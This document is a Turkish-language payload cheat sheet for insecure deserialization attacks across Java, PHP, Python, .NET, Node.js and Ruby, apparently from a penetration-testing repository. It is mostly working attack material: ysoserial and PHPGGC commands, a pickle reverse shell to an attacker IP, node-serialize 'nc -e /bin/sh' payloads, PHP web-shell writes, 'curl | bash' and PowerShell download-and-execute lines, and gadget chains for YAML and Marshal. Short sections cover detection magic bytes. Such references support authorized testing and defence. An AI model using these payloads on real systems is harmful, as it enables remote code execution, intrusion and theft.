# 🔓 Güvensiz Serileştirme (Deserialization) Payload Koleksiyonu

[🇬🇧 English](../Deserialization.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Java Serileştirme (Java Deserialization)

### Tespit (Detection)
```
# Sihirli Baytlar (Magic Bytes)
AC ED 00 05    # Java serileştirilmiş nesnesi (Base64: rO0AB)
H4sIAAAA       # GZip sıkıştırmalı format

# Yaygın Bulunma Noktaları
- Çerezler (Cookies - Base64 kodlu)
- Gizli form alanları (Hidden fields)
- ViewState parametreleri
- API parametreleri
- RMI servisi (port 1099)
- JMX servisi (port 9010)
```

### ysoserial - Payload Üreticisi
```bash
# Kurulum
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Payload üretimi
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://SALDIRGAN_IP/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 SALDIRGAN_IP"

# Yaygın Gadget Zincirleri (Gadget Chains)
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### DNS Tabanlı Veri Sızdırma (DNS Exfiltration)
```bash
# DNS geri çağırma (callback) payload'ı üretme
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# DNS tabanlı tespit
java -jar ysoserial.jar JRMPClient "SALDIRGAN_IP:1099"
```

### Yaygın Zafiyetli Kütüphaneler
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 PHP Serileştirme (PHP Deserialization)

### Sihirli Metotlar (Magic Methods)
```php
__construct()    // Nesne ilk oluşturulduğunda çağrılır
__destruct()     // Nesne bellekten silinirken / yok edilirken çağrılır
__wakeup()       // unserialize() çalıştırıldığında tetiklenir
__sleep()        // serialize() çalıştırıldığında tetiklenir
__toString()     // Nesne metin (string) olarak değerlendirildiğinde çağrılır
__call()         // Erişilemeyen / tanımlanmamış metot çağrıldığında
__get()          // Erişilemeyen özelliğe erişilmeye çalışıldığında
__set()          // Erişilemeyen özelliğe değer atanmaya çalışıldığında
```

### Temel Payload Yapısı
```php
// Serileştirilmiş nesne biçimi
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Niteliklere sahip nesne
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Dizi biçimi
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Tip Dönüşümü Zaafları (Type Juggling)
```php
// Mantıksal doğru (boolean true) atlatması
O:4:"User":1:{s:8:"password";b:1;}

// Tamsayı 0 karşılaştırma hilesi
O:4:"User":1:{s:8:"password";i:0;}

// Dizi karşılaştırma atlatması
O:4:"User":1:{s:8:"password";a:0:{}}
```

### POP Zinciri (POP Chain) Payload'ları
```php
// Rastgele dosya yazma (Arbitrary file write)
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// __destruct() üzerinden komut çalıştırma
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC - PHP Gadget Chain Aracı
```bash
# Kurulum
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Kullanılabilir gadget zincirlerini listeleme
./phpggc -l

# Payload üretme
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Base64 kodlaması ile
./phpggc -b Laravel/RCE1 system "id"

# URL kodlaması ile
./phpggc -u Laravel/RCE1 system "id"

# Phar sarmalayıcısı ile çıktı oluşturma
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Phar Serileştirme Zafiyeti
```php
// Phar arşivlerine erişildiğinde otomatik nesne serileştirme tetiklenir
phar://path/to/phar.phar/internal-file

// phar:// sarmalayıcısını tetikleyen PHP fonksiyonları
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Python Serileştirme (Pickle)

### Temel Payload
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Ters Bağlantı (Reverse Shell) Payload'ı
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"SALDIRGAN_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Tespit (Detection)
```
# Sihirli Baytlar
80 04 95    # Protokol 4 (Python 3)
80 03       # Protokol 3
80 02       # Protokol 2

# Yaygın Base64 Başlangıç İmzaları
gASV        # Protokol 4
gAN         # Protokol 3
```

### YAML Serileştirme (PyYAML)
```yaml
# PyYAML güvensiz yükleme (unsafe load)
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Çoklu komut çalıştırma
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://SALDIRGAN_IP/shell.sh | bash"
```

---

## 🔷 .NET Serileştirme

### Tespit (Detection)
```
# ViewState
__VIEWSTATE parametresi (Base64)

# BinaryFormatter
AAEAAAD/////    # Base64 sihirli deseni

# JSON.NET
JSON nesnelerinde $type alanı
```

### ysoserial.net - Payload Üreticisi
```powershell
# İndirme: https://github.com/pwntester/ysoserial.net

# Payload üretme
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Yaygın gadget'lar
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://SALDIRGAN_IP/shell.ps1')"

# ViewState istismarı
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping SALDIRGAN_IP" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling İstismarı
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript / Node.js

### node-serialize
```javascript
// Zafiyetli kod örneği: unserialize(user_input)
// IIFE (Immediately Invoked Function Expression) payload'ı
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Ters kabuk (Reverse shell)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh SALDIRGAN_IP 4444')}()"}
```

### serialize-javascript
```javascript
// Eğer serileştirilmiş veri eval() fonksiyonuna verilirse
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Ruby Serileştirme

### Marshal.load
```ruby
# Payload oluşturma
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Test Kontrol Listesi (Checklist)

```markdown
□ Serileştirme biçimini tespit edin (Base64, hex, sihirli baytlar)
□ Çalışma zamanı dilini ve framework'ü belirleyin (Java, PHP, Python, .NET)
□ Kütüphane sürümlerini kontrol edin
□ Uygun araçla hedef ortama özel payload üretin
□ DNS / HTTP geri çağırmaları ile kör tespit gerçekleştirin
□ Dosya okuma / yazma senaryolarını test edin
□ Kod yürütme (RCE) aşamasına geçin
□ Farklı gadget zincirlerini deneyin
□ Filtre ve WAF atlatmalarını test edin (kodlama, sıkıştırma)
```

---

## 🔗 Araç Özeti

| Dil | Araç | Örnek Komut |
|-----|------|-------------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Özel betik | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Özel betik | Manuel payload üretimi |

---

## 🔗 İlgili Kılavuzlar

- [SSTI Payload'ları](./SSTI.tr.md)
- [Komut Enjeksiyonu](./Command-Injection.tr.md)

---

**Ana Dizine Dön:** [📖 Genel Kılavuz](../../README.tr.md)
